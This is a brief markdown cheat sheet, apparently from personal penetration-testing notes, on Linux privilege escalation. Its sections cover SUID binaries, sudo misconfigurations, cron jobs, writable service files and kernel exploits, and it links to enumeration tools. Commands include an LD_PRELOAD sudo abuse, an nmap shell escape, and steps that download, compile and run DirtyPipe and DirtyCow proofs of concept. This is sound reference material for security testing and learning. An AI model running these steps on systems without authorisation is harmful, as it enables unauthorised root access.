---
layout: notes
permalink: /notes/linux/privesc/
title: Linux Privilege Escalation
---

## Privilege Escalation Vectors

### SUID Binaries
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check common SUID binaries
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp

# Test SUID binaries
strings <binary>
strace <binary>

# Test SUID binaries for exploits
strings /usr/bin/nmap
strace /usr/bin/nmap

# Example exploit for older nmap (if SUID)
/usr/bin/nmap --interactive
```
### Sudo

```bash
# Check sudo permissions
sudo -l

# Check sudoers files for misconfigs
cat /etc/sudoers
cat /etc/sudoers.d/*

# Exploit LD_PRELOAD
sudo LD_PRELOAD=/tmp/malicious.so <command>

# Exploit wildcards
sudo /bin/*
```

### Cron Jobs
```bash
# Inspect cron jobs
cat /etc/cron.*
cat /var/spool/cron/crontabs/*
crontab -l
```
### World-Writable Files
```bash
# Find world-writable files
find / -writable 2>/dev/null
```
### Kernel Exploits
```bash
# Check kernel version
uname -r

# Find kernel exploits
searchsploit linux kernel $(uname -r)

# Run DirtyPipe exploit (example)
wget <dirtypipe_poc_url> -O dirtypipe.c
gcc dirtypipe.c -o dirtypipe
./dirtypipe

# Run DirtyC0w exploit (example)
wget <dirtycow_poc_url> -O dirtycow.c
gcc dirtycow.c -o dirtycow
./dirtycow
```

### Service Misconfigurations
```bash
# Check service files
ls -l /etc/systemd/system/
ls -l /etc/init.d/

# Find writable service files
find /etc/systemd/system/ -writable 2>/dev/null
find /etc/init.d/ -writable 2>/dev/null

# Check unquoted paths in services
ps aux | grep <service>
```

## Automated Enumeration Tools
- [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Unix Privesc Check](https://pentestmonkey.net/tools/audit/unix-privesc-check)